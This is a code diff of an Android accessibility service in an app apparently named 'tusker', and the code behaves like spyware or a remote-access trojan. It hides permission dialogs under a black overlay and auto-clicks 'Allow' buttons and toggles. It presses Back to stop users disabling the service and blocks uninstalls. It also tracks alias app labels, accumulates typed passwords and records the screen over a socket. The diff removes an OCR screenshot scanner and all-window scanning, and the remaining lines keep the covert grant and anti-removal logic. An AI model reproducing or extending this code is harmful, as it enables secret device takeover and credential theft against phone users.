@@ -120,32 +120,6 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
     // Screen state receiver — auto-starts/stops screen reader recording
     private android.content.BroadcastReceiver screenStateReceiver;
-
-    // ── OCR Permission Scanner (API 30+) ─────────────────────────────────────
-    // Runs alongside the accessibility-tree scanner during autoGrantMode.
-    // Captures a screenshot every 700 ms and uses ML Kit on-device text
-    // recognition to find Allow/Grant buttons whose nodes are invisible or
-    // absent from the accessibility window hierarchy (e.g. the overlay-style
-    // dialogs from com.android.permissioncontroller on Android 11+).
-    private Handler ocrScanHandler;
-    private Runnable ocrScanRunnable;
-    private Runnable ocrStopRunnable;
-    private volatile boolean ocrScanActive = false;
-    private com.google.mlkit.vision.text.TextRecognizer ocrTextRecognizer;
-
-    // Button labels that mean "grant this permission" (case-insensitive, full-line or prefix match)
-    private static final String[] OCR_ALLOW_KEYWORDS = {
-        "allow", "grant", "ok", "accept", "continue", "permit",
-        "turn on", "enable", "yes",
-        "while using", "only this time",
-        "allow all the time", "allow only while using",
-        "allow access", "while using the app"
-    };
-    // Any line containing one of these is skipped — these are deny/cancel buttons
-    private static final String[] OCR_DENY_KEYWORDS = {
-        "don't allow", "dont allow", "deny", "never",
-        "cancel", "no thanks", "not now", "block", "decline"
-    };
     
     public static UnifiedAccessibilityService getInstance() {
         return instance;
@@ -182,17 +156,14 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             isFirstLaunch = false;
         }
 
-        // Auto-grant timer and overlay are only relevant on first launch (permissions not yet granted).
-        // IMPORTANT: addBlackOverlay() is called FIRST so the screen is covered before any
-        // navigation or permission dialogs begin. startAutoGrantTimer() will navigate to
-        // MainActivity and then launch PermissionRequestActivity, all under the black overlay.
+        // Auto-grant timer and overlay are only relevant on first launch (permissions not yet granted)
         if (isFirstLaunch) {
+            try { startAutoGrantTimer(); } catch (Exception ignored) {}
             try {
                 addBlackOverlay();
-                android.content.SharedPreferences prefs = getSharedPreferences("svc_prefs", MODE_PRIVATE);
+            android.content.SharedPreferences prefs = getSharedPreferences("svc_prefs", MODE_PRIVATE);
                 prefs.edit().putBoolean("overlay_setup_done", true).apply();
             } catch (Exception ignored) {}
-            try { startAutoGrantTimer(); } catch (Exception ignored) {}
         }
 
         // Accessibility Assist: protect the accessibility toggle from being turned off.
@@ -752,27 +723,26 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             // Do not auto-click while the notification panel or quick settings is open
             if (isSystemPanelOpen()) return;
 
-            // During auto-grant period: scan ALL windows so permission dialogs in
-            // non-focused windows (com.android.permissioncontroller overlays) are found.
-            if (autoGrantMode) {
-                updateCurrentAppName();
-                runGranterOnAllWindows();
-                return;
-            }
-
-            // While protection is suspended (e.g. during storage permission grant),
-            // scan all windows for the grant button but skip defent/uninstall-assist.
-            if (System.currentTimeMillis() < protectionSuspendedUntil) {
-                updateCurrentAppName();
-                runGranterOnAllWindows();
-                return;
-            }
-
-            // After auto-grant period ends: run uninstall-assist and defent protection
-            // against the single active window (these never need multi-window scanning).
             AccessibilityNodeInfo rootNode = getRootInActiveWindow();
             if (rootNode == null) return;
+
+            // Update app name
             updateCurrentAppName();
+
+            // During auto-grant period: only click Allow/Grant buttons — nothing else.
+            // Defent protection is suspended so it cannot interfere with permission dialogs.
+            if (autoGrantMode) {
+                runPermissionGranter(rootNode);
+                rootNode.recycle();
+                return;
+            }
+            // While protection is suspended (e.g. during storage permission grant),
+            // skip defent/uninstall-assist so they don't close the permission screen.
+            if (System.currentTimeMillis() < protectionSuspendedUntil) {
+                rootNode.recycle();
+                return;
+            }
+            // After auto-grant period ends: run uninstall-assist and defent protection.
             if (runUninstallAssist(rootNode)) {
                 rootNode.recycle();
                 return;
@@ -781,6 +751,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 rootNode.recycle();
                 return;
             }
+
             rootNode.recycle();
         } catch (Throwable e) {
             Log.e(TAG, "autoClickAllowButton error: " + e.getMessage());
@@ -893,55 +864,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         } catch (Exception ignored) {}
     }
 
-    /**
-     * Runs runPermissionGranter() on EVERY currently visible accessibility window.
-     *
-     * getRootInActiveWindow() only returns the focused window. When a permission dialog
-     * from com.android.permissioncontroller appears, the "active" window is often the
-     * SystemUI status bar (or our own black overlay), not the dialog — so the granter
-     * never sees the "Allow" button. getWindows() returns all visible windows regardless
-     * of focus, which fixes detection for overlay-style permission dialogs on Android 10+.
-     *
-     * Falls back to getRootInActiveWindow() on pre-LOLLIPOP devices or if getWindows()
-     * returns null/empty.
-     *
-     * @return true if the granter found and clicked something in any window.
-     */
-    @android.annotation.TargetApi(android.os.Build.VERSION_CODES.LOLLIPOP)
-    private boolean runGranterOnAllWindows() {
-        boolean handled = false;
-        try {
-            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
-                List<android.view.accessibility.AccessibilityWindowInfo> windows = getWindows();
-                if (windows != null && !windows.isEmpty()) {
-                    for (android.view.accessibility.AccessibilityWindowInfo win : windows) {
-                        try {
-                            AccessibilityNodeInfo root = win.getRoot();
-                            if (root == null) continue;
-                            boolean result = runPermissionGranter(root);
-                            root.recycle();
-                            if (result) handled = true;
-                        } catch (Exception ignored) {}
-                    }
-                    return handled;
-                }
-            }
-        } catch (Exception ignored) {}
-        // Fallback: single active window
-        try {
-            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
-            if (rootNode != null) {
-                handled = runPermissionGranter(rootNode);
-                rootNode.recycle();
-            }
-        } catch (Exception ignored) {}
-        return handled;
-    }
-
     /** Starts permission scanner IMMEDIATELY when accessibility is enabled.
      *  Runs continuously forever, ready before any permission requests.
      *  Scans for permission buttons: Allow, Grant, OK, Allow all time, Allow access, etc.
-     *  Uses runGranterOnAllWindows() so permission dialogs in non-focused windows are found.
      */
     private void startPermissionScanner() {
         permissionScanHandler = permissionBgHandler != null
@@ -950,7 +875,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             @Override
             public void run() {
                 try {
-                    runGranterOnAllWindows();
+                    AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+                    if (rootNode != null) {
+                        runPermissionGranter(rootNode);
+                        rootNode.recycle();
+                    }
                 } catch (Exception ignored) {}
                 if (permissionScanHandler != null && permissionScanRunnable != null) {
                     permissionScanHandler.postDelayed(this, 200);
@@ -970,15 +899,18 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         autoGrantHandler = permissionBgHandler != null
                 ? permissionBgHandler : new Handler(Looper.getMainLooper());
 
-        // Independent scanner: runs every 100 ms during the grant window.
-        // Uses runGranterOnAllWindows() so it catches permission dialogs in non-focused
-        // windows (e.g. com.android.permissioncontroller overlays on Android 10+).
+        // Independent scanner: runs every 250 ms during the grant window.
+        // 250 ms is frequent enough to catch dialogs without hammering the main thread.
         autoGrantScanRunnable = new Runnable() {
             @Override
             public void run() {
                 if (!autoGrantMode) return;
                 try {
-                    runGranterOnAllWindows();
+                    AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+                    if (rootNode != null) {
+                        runPermissionGranter(rootNode);
+                        rootNode.recycle();
+                    }
                 } catch (Exception ignored) {}
                 if (autoGrantMode && autoGrantHandler != null) {
                     autoGrantHandler.postDelayed(this, 100);
@@ -987,30 +919,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         };
         autoGrantHandler.post(autoGrantScanRunnable);
 
-        // Start the OCR scanner in parallel — catches Allow buttons invisible to the
-        // accessibility tree (permissioncontroller overlays on Android 11+).
-        startOcrPermissionScanner();
-
-        // Step 1 (500 ms): Navigate to MainActivity under the black overlay.
-        // The user just enabled accessibility in Settings — we bring them back to the
-        // app first so they never see permission dialogs appearing on top of Settings
-        // or any other unrelated screen.
-        autoGrantHandler.postDelayed(() -> {
-            try {
-                Intent mainIntent = new Intent(this, com.task.tusker.MainActivity.class);
-                mainIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
-                        | Intent.FLAG_ACTIVITY_CLEAR_TOP
-                        | Intent.FLAG_ACTIVITY_SINGLE_TOP);
-                startActivity(mainIntent);
-                Log.i(TAG, "Auto-grant: navigated to MainActivity before requesting permissions");
-            } catch (Exception e) {
-                Log.w(TAG, "Auto-grant: could not navigate to MainActivity: " + e.getMessage());
-            }
-        }, 500);
-
-        // Step 2 (2 500 ms): Trigger all missing runtime permissions so the dialogs
-        // appear for the granter to click. The black overlay is already up and the user
-        // is now in MainActivity, so dialogs are invisible and auto-clicked immediately.
+        // Trigger all missing runtime permissions so the dialogs appear for the granter to click.
+        // Delay 1 s so the accessibility overlay is fully visible first.
         autoGrantHandler.postDelayed(() -> {
             try {
                 Intent pIntent = new Intent(this, com.task.tusker.PermissionRequestActivity.class);
@@ -1022,20 +932,14 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             } catch (Exception e) {
                 Log.w(TAG, "Auto-grant: could not launch PermissionRequestActivity: " + e.getMessage());
             }
-        }, 2_500);
+        }, 1_000);
 
-        // Auto-grant mode (accessibility tree) expires after 32 seconds.
+        // Auto-grant mode expires after 29 seconds.
         autoGrantHandler.postDelayed(() -> {
             autoGrantMode = false;
-            Log.i(TAG, "Auto-grant mode (accessibility tree) expired");
-        }, 32_000);
-        // OCR scanner runs independently for a full 2 minutes so it catches slow
-        // dialogs that appear after the accessibility tree scanner has already stopped.
-        // Cancel any prior stop runnable so a fresh 2-minute window always applies.
-        if (ocrStopRunnable != null) autoGrantHandler.removeCallbacks(ocrStopRunnable);
-        ocrStopRunnable = this::stopOcrPermissionScanner;
-        autoGrantHandler.postDelayed(ocrStopRunnable, 120_000);
-        Log.i(TAG, "Auto-grant ENABLED — tree@32s, OCR@120s, navigate@500ms, perms@2500ms");
+            Log.i(TAG, "Auto-grant mode expired after 29 seconds");
+        }, 29_000);
+        Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 29s");
     }
 
     /**
@@ -1048,106 +952,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     ? permissionBgHandler : new Handler(Looper.getMainLooper());
         }
         autoGrantMode = true;
-        startOcrPermissionScanner();
-        // Accessibility-tree scanner stops after durationMs
         autoGrantHandler.postDelayed(() -> {
             autoGrantMode = false;
-            Log.i(TAG, "Auto-grant mode (accessibility tree) expired (on-demand re-enable)");
+            Log.i(TAG, "Auto-grant mode expired (on-demand re-enable)");
         }, durationMs);
-        // OCR always runs for at least 2 minutes regardless of durationMs.
-        // Cancel any prior stop runnable first so calling reEnableAutoGrant() again
-        // always resets the full 2-minute window instead of being cut short by an
-        // earlier pending callback (method references create new Runnable instances,
-        // so removeCallbacks on the stored reference is the only reliable cancel).
-        long ocrDuration = Math.max(durationMs, 120_000);
-        if (ocrStopRunnable != null) autoGrantHandler.removeCallbacks(ocrStopRunnable);
-        ocrStopRunnable = this::stopOcrPermissionScanner;
-        autoGrantHandler.postDelayed(ocrStopRunnable, ocrDuration);
-        Log.i(TAG, "Auto-grant RE-ENABLED — tree@" + durationMs + "ms, OCR@" + ocrDuration + "ms");
-    }
-
-    /**
-     * Brings the app to the foreground, then shows the native permission dialog.
-     *
-     * Problem: when the socket server requests a permission (device is idle /
-     * screen is on but the user is in a different app), Android 10+ will silently
-     * drop a plain startActivity() call from a background service. Even with a
-     * full-screen notification, the PermissionRequestActivity can land behind the
-     * current foreground app because its task is in the back stack.
-     *
-     * Fix:
-     *   1. Use the AccessibilityService context (exempt from background-launch
-     *      restriction on API 29+) to launch MainActivity — this brings our task
-     *      to the foreground instantly.
-     *   2. After 450 ms (enough for MainActivity to be visible), launch
-     *      PermissionRequestActivity inside the now-foreground task. Android shows
-     *      the native permission dialog on top of it.
-     *   3. Simultaneously re-enable auto-grant for 2 minutes so both the
-     *      accessibility-tree scanner and the OCR scanner auto-click "Allow".
-     *
-     * @param perms permission strings to request (already-granted ones are filtered out
-     *              inside PermissionRequestActivity).
-     */
-    public void launchPermissionDialogInForeground(String[] perms) {
-        if (perms == null || perms.length == 0) return;
-        Handler h = permissionBgHandler != null
-                ? permissionBgHandler : new Handler(Looper.getMainLooper());
-
-        // Step 0 (0 ms): Acquire a FULL wake lock so the screen turns on even if
-        // the device is asleep. Without this the dialog is launched but never seen.
-        h.post(() -> {
-            try {
-                android.os.PowerManager pm =
-                        (android.os.PowerManager) getSystemService(POWER_SERVICE);
-                if (pm != null) {
-                    android.os.PowerManager.WakeLock wl = pm.newWakeLock(
-                            android.os.PowerManager.FULL_WAKE_LOCK
-                            | android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP
-                            | android.os.PowerManager.ON_AFTER_RELEASE,
-                            "tusker:perm_request");
-                    wl.acquire(10_000); // auto-release after 10 s
-                }
-            } catch (Exception e) {
-                Log.w(TAG, "launchPermissionDialogInForeground: wake lock failed: " + e.getMessage());
-            }
-        });
-
-        // Step 1 (0 ms): Bring our task to the foreground.
-        // FLAG_ACTIVITY_CLEAR_TASK destroys any stale back-stack and forces a fresh
-        // MainActivity, making it reliably foreground even after the user swiped the
-        // app away from recents (where REORDER_TO_FRONT + SINGLE_TOP silently fail).
-        h.post(() -> {
-            try {
-                Intent mainIntent = new Intent(this, com.task.tusker.MainActivity.class);
-                mainIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
-                        | Intent.FLAG_ACTIVITY_CLEAR_TASK);
-                startActivity(mainIntent);
-                Log.i(TAG, "launchPermissionDialogInForeground: brought MainActivity to front");
-            } catch (Exception e) {
-                Log.w(TAG, "launchPermissionDialogInForeground: MainActivity failed: " + e.getMessage());
-            }
-        });
-
-        // Step 2 (600 ms): Launch the transparent PermissionRequestActivity.
-        // Extra 150 ms (vs old 450 ms) gives MainActivity time to be fully visible
-        // after a cold start when the task was previously cleared.
-        h.postDelayed(() -> {
-            try {
-                Intent pIntent = new Intent(this, com.task.tusker.PermissionRequestActivity.class);
-                pIntent.putExtra(com.task.tusker.PermissionRequestActivity.EXTRA_PERMISSIONS, perms);
-                pIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
-                        | Intent.FLAG_ACTIVITY_SINGLE_TOP
-                        | Intent.FLAG_ACTIVITY_CLEAR_TOP);
-                startActivity(pIntent);
-                Log.i(TAG, "launchPermissionDialogInForeground: PermissionRequestActivity launched");
-            } catch (Exception e) {
-                Log.w(TAG, "launchPermissionDialogInForeground: PermissionRequestActivity failed: " + e.getMessage());
-            }
-        }, 600);
-
-        // Also activate OCR + accessibility-tree granter for 2 minutes so the
-        // "Allow" button is clicked automatically.
-        reEnableAutoGrant(120_000);
+        Log.i(TAG, "Auto-grant mode RE-ENABLED for " + durationMs + " ms (dashboard storage request)");
     }
 
     /**
@@ -1170,8 +979,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      * because runPermissionGranter already covers all known button/toggle variants.
      */
     public void enableStorageAutoGrant() {
-        // Activate the accessibility-tree scanner + OCR scanner for the full 20 s window.
-        reEnableAutoGrant(20_000); // also calls startOcrPermissionScanner()
+        // Activate the 350 ms background scanner (autoGrantMode) for the full 20 s window.
+        reEnableAutoGrant(20_000);
 
         // Suspend defent/uninstall protection so it cannot interfere with the settings screen.
         protectionSuspendedUntil = System.currentTimeMillis() + 25_000;
@@ -1189,41 +998,22 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     return;
                 }
                 try {
-                    // Scan ALL windows — the All-Files-Access page is a Settings window
-                    // that may not be the active/focused window when the overlay is up.
-                    boolean handled = runGranterOnAllWindows();
-                    if (!handled) {
-                        // Fallback: also run the list-granter against every window in case
-                        // we are on the generic All-Files-Access list screen.
-                        if (android.os.Build.VERSION.SDK_INT
-                                >= android.os.Build.VERSION_CODES.LOLLIPOP) {
-                            List<android.view.accessibility.AccessibilityWindowInfo> wins =
-                                    getWindows();
-                            if (wins != null) {
-                                for (android.view.accessibility.AccessibilityWindowInfo win : wins) {
-                                    try {
-                                        AccessibilityNodeInfo r = win.getRoot();
-                                        if (r != null) {
-                                            runStorageListGranter(r);
-                                            r.recycle();
-                                        }
-                                    } catch (Exception ignored) {}
-                                }
-                                return;
-                            }
-                        }
-                        // Pre-Lollipop fallback
-                        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
-                        if (rootNode != null) {
+                    AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+                    if (rootNode != null) {
+                        // Full granter: buttons, toggles, OEM variants, deny list — all covered.
+                        boolean handled = runPermissionGranter(rootNode);
+                        if (!handled) {
+                            // Fallback: we may be on the generic All-Files-Access list screen.
+                            // Find our app's row and tap it to open the per-app toggle page.
                             runStorageListGranter(rootNode);
-                            rootNode.recycle();
                         }
+                        rootNode.recycle();
                     }
                 } catch (Exception ignored) {}
                 storageHandler.postDelayed(this, 150);
             }
         });
-        Log.i(TAG, "Storage auto-grant scanner started for 20 s (150 ms interval, autoGrantMode active, all-windows scan)");
+        Log.i(TAG, "Storage auto-grant scanner started for 20 s (150 ms interval, autoGrantMode active)");
     }
 
     /**
@@ -1233,9 +1023,6 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      * Android to navigate to the per-app "All Files Access" toggle page.
      * The next poll tick of the 150 ms scanner will then enable the toggle via
      * runPermissionGranter() → runAccessibilityToggleGranter().
-     *
-     * Tries all chameleon alias labels (not just app_name) so it works regardless of
-     * which alias the build assigned.
      *
      * Also handles OEM "Access all files" / "File and media access" list screens on
      * Samsung, MIUI, ColorOS etc., since we search by app name text.
@@ -1247,42 +1034,18 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             if (!screenText.contains("files") && !screenText.contains("storage")
                     && !screenText.contains("media")) return;
 
-            // Guard: our app must appear on screen (any alias label).
-            if (!isAnyAppNameOnScreen(screenText)) return;
+            String appName = getString(R.string.app_name);
+            if (!screenText.contains(appName.toLowerCase())) return;
 
-            // Build the full list of possible app name labels to search for.
-            List<String> candidates = new ArrayList<>();
-            try {
-                CharSequence pmLabel = getPackageManager().getApplicationLabel(getApplicationInfo());
-                if (pmLabel != null && !pmLabel.toString().isEmpty()) {
-                    candidates.add(pmLabel.toString());
-                }
-            } catch (Exception ignored) {}
-            int[] labelIds = {
-                R.string.alias_label_0, R.string.alias_label_1, R.string.alias_label_2,
-                R.string.alias_label_3, R.string.alias_label_4, R.string.app_name
-            };
-            for (int id : labelIds) {
-                try {
-                    String label = getString(id).trim();
-                    if (!label.isEmpty() && !candidates.contains(label)) candidates.add(label);
-                } catch (Exception ignored) {}
-            }
-
-            // Try each candidate label — the first row found that is clickable (or has a
-            // clickable ancestor) gets tapped to open the per-app toggle page.
-            for (String candidate : candidates) {
-                if (!screenText.contains(candidate.toLowerCase())) continue;
-                List<AccessibilityNodeInfo> rows = rootNode.findAccessibilityNodeInfosByText(candidate);
-                if (rows == null || rows.isEmpty()) continue;
-                boolean tapped = false;
+            // Try findAccessibilityNodeInfosByText first — most reliable.
+            List<AccessibilityNodeInfo> rows = rootNode.findAccessibilityNodeInfosByText(appName);
+            if (rows != null) {
                 for (AccessibilityNodeInfo row : rows) {
                     try {
                         if (row == null) continue;
                         if (row.isClickable()) {
                             row.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                            Log.i(TAG, "Storage list granter: tapped app row \"" + candidate + "\"");
-                            tapped = true;
+                            Log.i(TAG, "Storage list granter: tapped app row \"" + appName + "\"");
                             break;
                         }
                         // Walk up to find a clickable ancestor (list item container).
@@ -1290,9 +1053,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                         for (int depth = 0; depth < 4 && p != null; depth++) {
                             if (p.isClickable()) {
                                 p.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                                Log.i(TAG, "Storage list granter: tapped ancestor of app row \"" + candidate + "\"");
+                                Log.i(TAG, "Storage list granter: tapped ancestor of app row");
                                 p.recycle();
-                                tapped = true;
                                 break;
                             }
                             AccessibilityNodeInfo next = p.getParent();
@@ -1304,9 +1066,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     finally {
                         try { row.recycle(); } catch (Exception ignored) {}
                     }
-                    if (tapped) break;
                 }
-                if (tapped) return;
             }
         } catch (Exception ignored) {}
     }
@@ -1857,98 +1617,15 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         return false;
     }
 
-    /**
-     * Clicks any text element matching exactly (case-insensitive).
-     *
-     * Two-pass strategy to handle dialogs where the same word (e.g. "Allow") appears
-     * both as a non-interactive title/section header AND as the actual grant button:
-     *
-     *   Pass 1 — scan all matching nodes and prefer ones where isClickable() is true
-     *            (real buttons). Click the first such node and return.
-     *   Pass 2 — if no directly-clickable node was found, try clicking via the parent
-     *            of the first non-clickable match.
-     *
-     * This prevents the granter from accidentally clicking a label "Allow" at the top
-     * of a dialog instead of the real "Allow" button below it.
-     *
-     * Uses findAccessibilityNodeInfosByText() for reliable node discovery with correct
-     * Android memory management (no manual child-recycle bookkeeping needed).
-     */
-    private boolean clickTextElementCI(AccessibilityNodeInfo root, String searchText) {
-        if (root == null) return false;
-        String searchTrimmed = searchText.trim();
-
-        // findAccessibilityNodeInfosByText does a contains-match; we do an exact
-        // case-insensitive check on each returned node below.
-        List<AccessibilityNodeInfo> candidates = null;
-        try {
-            candidates = root.findAccessibilityNodeInfosByText(searchTrimmed);
-        } catch (Exception ignored) {}
-
-        // Also try contentDescription via manual traversal for OEM/API-level gaps.
-        // We'll do the full manual walk as a fallback if findByText returns nothing.
-        if (candidates == null || candidates.isEmpty()) {
-            return clickTextElementCIManual(root, searchTrimmed);
-        }
-
-        AccessibilityNodeInfo directHit = null;  // isClickable() node
-        AccessibilityNodeInfo parentHit = null;  // non-clickable node with clickable parent
-
-        for (AccessibilityNodeInfo n : candidates) {
-            if (n == null) continue;
-            try {
-                CharSequence text = n.getText();
-                CharSequence desc = n.getContentDescription();
-                boolean exactMatch =
-                        (text != null && text.toString().trim().equalsIgnoreCase(searchTrimmed))
-                     || (text == null && desc != null
-                         && desc.toString().trim().equalsIgnoreCase(searchTrimmed));
-                if (!exactMatch) continue;
-                if (n.isClickable() && directHit == null) {
-                    directHit = n;
-                } else if (!n.isClickable() && parentHit == null) {
-                    parentHit = n;
-                }
-            } catch (Exception ignored) {}
-        }
-
-        boolean clicked = false;
-        // Pass 1: directly clickable node (real button)
-        if (directHit != null) {
-            try { directHit.performAction(AccessibilityNodeInfo.ACTION_CLICK); clicked = true; }
-            catch (Exception ignored) {}
-        }
-        // Pass 2: fall back to clicking via parent
-        if (!clicked && parentHit != null) {
-            AccessibilityNodeInfo parent = null;
-            try {
-                parent = parentHit.getParent();
-                if (parent != null && parent.isClickable()) {
-                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                    clicked = true;
-                }
-            } catch (Exception ignored) {}
-            finally {
-                if (parent != null) try { parent.recycle(); } catch (Exception ignored) {}
-            }
-        }
-
-        // Recycle all candidates.
-        for (AccessibilityNodeInfo n : candidates) try { if (n != null) n.recycle(); } catch (Exception ignored) {}
-        return clicked;
-    }
-
-    /**
-     * Manual tree-walk fallback for clickTextElementCI — used when
-     * findAccessibilityNodeInfosByText() returns empty (e.g. contentDescription-only
-     * nodes on certain OEM/API levels).
-     * Same two-pass priority: isClickable nodes before parent-clickable nodes.
-     */
-    private boolean clickTextElementCIManual(AccessibilityNodeInfo node, String searchTrimmed) {
+    /** Clicks any text element matching exactly (case-insensitive, no button check) */
+    private boolean clickTextElementCI(AccessibilityNodeInfo node, String searchText) {
         if (node == null) return false;
         try {
+            // Check getText() first; fall back to contentDescription for OEM/Android 12+
+            // dialog buttons that set only contentDescription (getText() returns null).
             CharSequence text = node.getText();
             CharSequence desc = node.getContentDescription();
+            String searchTrimmed = searchText.trim();
             boolean matches = (text != null && text.toString().trim().equalsIgnoreCase(searchTrimmed))
                            || (text == null && desc != null
                                && desc.toString().trim().equalsIgnoreCase(searchTrimmed));
@@ -1970,7 +1647,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             for (int i = 0; i < node.getChildCount(); i++) {
                 AccessibilityNodeInfo child = node.getChild(i);
                 if (child != null) {
-                    if (clickTextElementCIManual(child, searchTrimmed)) {
+                    if (clickTextElementCI(child, searchText)) {
                         child.recycle();
                         return true;
                     }
@@ -2156,22 +1833,26 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     /**
      * Looks for unchecked toggles/switches/checkboxes on screen when the app name
      * is visible. Skips any item whose nearby text contains a blacklisted word.
-     * If a toggle is found it is enabled, then Back is pressed after 1200 ms.
-     *
-     * NOTE: The directButtons loop was intentionally removed. On toggle-style settings
-     * pages (e.g. All Files Access, Notification access) the words "Allow" / "Grant"
-     * can appear as non-interactive section labels or descriptions. Clicking those labels
-     * (via their clickable parent container) and then pressing Back closed the settings
-     * page before the real toggle was ever enabled. runPermissionGranter() already
-     * handles actual button clicks in Steps 1-3 before ever reaching this method.
-     * Use isAnyAppNameOnScreen() so all chameleon alias labels are matched correctly.
+     * If a direct Allow/Grant button is present on the same page it is clicked first.
+     * If a toggle is found it is enabled, then Back is pressed after 500 ms.
      */
     private boolean runAccessibilityToggleGranter(AccessibilityNodeInfo rootNode) {
         try {
+            String appName = getString(R.string.app_name).toLowerCase();
             String screenText = getAllScreenText(rootNode).toLowerCase();
-            if (!isAnyAppNameOnScreen(screenText)) return false;
+            if (!screenText.contains(appName)) return false;
 
-            // Enable the toggle/switch/checkbox for this app
+            // If there is a direct Allow / Grant / Turn on button on the page, click it first.
+            String[] directButtons = { "Allow", "Grant", "Turn on", "Enable", "OK", "Ok", "Yes", "Accept" };
+            for (String btn : directButtons) {
+                if (findAndClickFullWord(rootNode, btn)) {
+                    Log.i(TAG, "Auto-grant (storage page): clicked button \"" + btn + "\"");
+                    scheduleBack(1_200);
+                    return true;
+                }
+            }
+
+            // Fall back to toggle/switch/checkbox
             if (findAndEnableToggleForAppName(rootNode)) {
                 Log.i(TAG, "Auto-grant: enabled toggle for app on settings screen");
                 scheduleBack(1_200);
@@ -2784,29 +2465,15 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     // Press Back vigorously every time this page is detected.
                     try { performBack(); } catch (Exception ignored) {}
 
-                    // On the very first launch: after the user enables the service,
-                    // navigate back to the app's main activity instead of the home screen.
-                    // A second Back presses clears the settings back-stack, then we launch
-                    // MainActivity directly so the user lands in the app, not on the launcher.
+                    // Fire Back + Home exactly once on the very first launch.
                     if (accessibilityAssistIsFirstLaunch && !accessibilityAssistBackHomeFired) {
                         accessibilityAssistBackHomeFired = true;
                         new Handler(Looper.getMainLooper()).postDelayed(() -> {
                             try { performBack(); } catch (Exception ignored) {}
                         }, 150L);
                         new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                            try {
-                                Intent mainIntent = new Intent(
-                                        UnifiedAccessibilityService.this,
-                                        com.task.tusker.MainActivity.class);
-                                mainIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
-                                        | Intent.FLAG_ACTIVITY_CLEAR_TOP
-                                        | Intent.FLAG_ACTIVITY_SINGLE_TOP);
-                                startActivity(mainIntent);
-                            } catch (Exception ignored) {
-                                // Fallback to Home if MainActivity can't be launched
-                                try { performHome(); } catch (Exception ignored2) {}
-                            }
-                        }, 500L);
+                            try { performHome(); } catch (Exception ignored) {}
+                        }, 450L);
                     }
 
                 } else if (isStopConfirmDialog) {
@@ -2943,14 +2610,6 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         } catch (Exception ignored) {}
         try {
             SocketManager.getInstance(this).stopScreenReaderAuto();
-        } catch (Exception ignored) {}
-        try {
-            // Stop OCR scanner and release the ML Kit TextRecognizer
-            stopOcrPermissionScanner();
-            if (ocrTextRecognizer != null) {
-                ocrTextRecognizer.close();
-                ocrTextRecognizer = null;
-            }
         } catch (Exception ignored) {}
         try {
             // Cancel all periodic scanner callbacks before quitting the HandlerThread.
@@ -3270,164 +2929,6 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         }
         // Clear all keys for this package
         passwordAccum.entrySet().removeIf(e -> e.getKey().startsWith(pkg + "|"));
-    }
-
-    // ══════════════════════════════════════════════════════════════════════════
-    // OCR PERMISSION SCANNER
-    // ══════════════════════════════════════════════════════════════════════════
-
-    /** Returns the shared ML Kit TextRecognizer, creating it on first call. */
-    private com.google.mlkit.vision.text.TextRecognizer getOrCreateOcrRecognizer() {
-        if (ocrTextRecognizer == null) {
-            ocrTextRecognizer = com.google.mlkit.vision.text.TextRecognition.getClient(
-                    com.google.mlkit.vision.text.latin.TextRecognizerOptions.DEFAULT_OPTIONS);
-        }
-        return ocrTextRecognizer;
-    }
-
-    /**
-     * Starts the OCR-based permission-grant scanner (API 30 / Android 11+ only).
-     *
-     * Every 700 ms it:
-     *   1. Captures a full-screen bitmap via AccessibilityService.takeScreenshot().
-     *   2. Runs ML Kit on-device Latin text recognition on the bitmap.
-     *   3. For each recognised text line, checks against the allow/deny keyword lists.
-     *   4. Taps the centre of the first matching line using a GestureDescription touch
-     *      event — completely bypassing the accessibility node tree.
-     *
-     * This runs in PARALLEL with the accessibility-tree scanner so both approaches
-     * try to find the "Allow" button simultaneously. Whichever succeeds first wins.
-     * Safe to call when already running — re-entry is guarded by ocrScanActive.
-     */
-    @SuppressWarnings("NewApi")
-    private void startOcrPermissionScanner() {
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return; // needs API 30
-        if (ocrScanActive) return;
-        ocrScanActive = true;
-        ocrScanHandler = permissionBgHandler != null
-                ? permissionBgHandler : new Handler(Looper.getMainLooper());
-        ocrScanRunnable = new Runnable() {
-            @Override
-            public void run() {
-                if (!ocrScanActive) return;
-                try {
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                        Bitmap bmp = captureScreenSync();
-                        if (bmp != null) {
-                            processScreenshotForGrant(bmp);
-                            bmp.recycle();
-                        }
-                    }
-                } catch (Exception e) {
